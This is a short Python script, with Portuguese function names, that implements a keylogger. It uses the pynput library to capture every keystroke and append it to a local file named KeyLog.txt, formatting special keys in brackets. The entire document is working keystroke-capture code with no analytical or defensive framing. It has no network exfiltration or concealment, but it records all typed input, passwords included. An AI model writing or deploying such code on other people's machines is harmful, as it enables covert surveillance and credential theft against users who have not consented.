from pynput.keyboard import Key, Listener
import os
def ler():
   try:
      ler_log = open("KeyLog.txt","r")
      return ler_log.read()
      ler_log.close()
   except:
      return ""

def adicionar(novo,n1,n2):
   text=ler()
   with open("KeyLog.txt", "w") as arq:
      arq.write(text+novo[n1:n2])
      arq.close()

def on_press(key):
   limpar = str(key).count("'")
   if(key == Key.enter):
      adicionar("\n",0,None)
   elif(limpar >= 1):
      adicionar(str(key),1,-1)
   else:
      adicionar(f" [{str(key)}] ",0,None)

with Listener(on_press) as listener:
   print(listener.join())
